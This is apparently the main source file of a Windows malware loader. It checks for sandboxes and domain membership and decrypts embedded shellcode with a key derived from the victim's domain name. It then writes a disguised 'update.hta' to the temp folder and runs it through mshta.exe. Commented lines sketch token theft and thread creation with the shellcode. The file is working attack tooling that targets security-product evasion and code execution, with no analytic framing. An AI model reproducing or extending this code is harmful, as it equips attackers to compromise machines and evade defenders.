#include "Privileges.h"
#include "ProcHelpers.h"
#include "Cylance.h"
#include "MemInfo.h"
#include "antisandbox.h"
#include "Crypto.h"
#include <iostream>
#include <string.h>
#include <cstdlib>

// test HTA
#include "TestJavascript.h"
#include "TestHTAGen.h"
#include <fstream>

int main() {
	OptPrivs* p = new OptPrivs;
	
	SandboxInformation si;
	ZeroMemory(&si, sizeof(SandboxInformation));
	if (AntiSandbox::isDomainJoined(&si)) {
		// do something
	}
	else {
		// do something else
	}
	int domainNameLen = lstrlenW(si.Workgroup);
	char* key = new char[domainNameLen];
	uint8_t* buf = (uint8_t*)& SHELLCODE_BUF;
	uint8_t* launcher_buf = (uint8_t*)& LAUNCH_SHELLCODE_BUF;

	char* domainName = new char[domainNameLen];
	char* sha256_uname = new char[257];
	ZeroMemory(sha256_uname, 257);
	DWORD sha_bytes_returned;
	size_t charsConverted;

	if (si.Domain == NULL && si.Workgroup != NULL) {
		si.Domain = si.Workgroup;
	}
	memset(domainName, 0, domainNameLen);

	if (wcstombs_s(&charsConverted, domainName, (size_t)domainNameLen+1, si.Domain, (size_t)domainNameLen)) {
		exit(-2);
	}
	if (!OptCrypto::GetSHA256Hash(domainName, domainNameLen, (BYTE*)sha256_uname, &sha_bytes_returned))
		exit(-2);

	OptCrypto::AESCBCDecrypt(buf, (uint8_t*)sha256_uname, (uint8_t*)IV, SHELLCODE_LEN);
	OptCrypto::AESCBCDecrypt(launcher_buf, (uint8_t*)sha256_uname, (uint8_t*)LAUNCH_IV, LAUNCH_SHELLCODE_LEN);


	std::map<std::string, std::string> js_vars;
	LPSTR TEMP_DIR = new char[MAX_PATH];
	GetTempPathA(MAX_PATH, TEMP_DIR);
	std::string fname = TEMP_DIR;
	fname += "update.hta";
	std::ofstream outfile(fname, std::ofstream::binary);
	js_vars["payload_file"] = "C:\\Users\\biggest oof\\source\\repos\\TimeBomb\\test.xsl";
	std::string initial = TestHTAGen::renderFile((char*)buf, js_vars);
	outfile.write(initial.c_str(), initial.length());
	outfile.close();

	int time_sec_sleep = 3;
	while (time_sec_sleep--) {
		Sleep(1000);
		printf("%d... ", time_sec_sleep);
	}

	PH_THREAD_INFO pt;
	ZeroMemory(&pt, sizeof(pt));
	pt.pagePermissions = PAGE_EXECUTE_READ;
	pt.StackSpace = 0x4000;
	pt.ThreadCreateFlags = CREATE_SUSPENDED;
	std::string command = "%WINDIR%\\System32\\mshta.exe " + fname;
	system(command.c_str());
	std::cout << "and now, I slenp UwU" << std::endl;
	Sleep(INFINITE);
	//std::cout << "attempting to steal token and create new thread" << std::endl;
	//ProcHelper::EnableDebugPriv();
	//ProcHelper::PESetTokenFromPID(pe);
	//ProcHelper::CreateThreadWithToken(pe, SHELLCODE_BUF, sizeOfShellcode);
}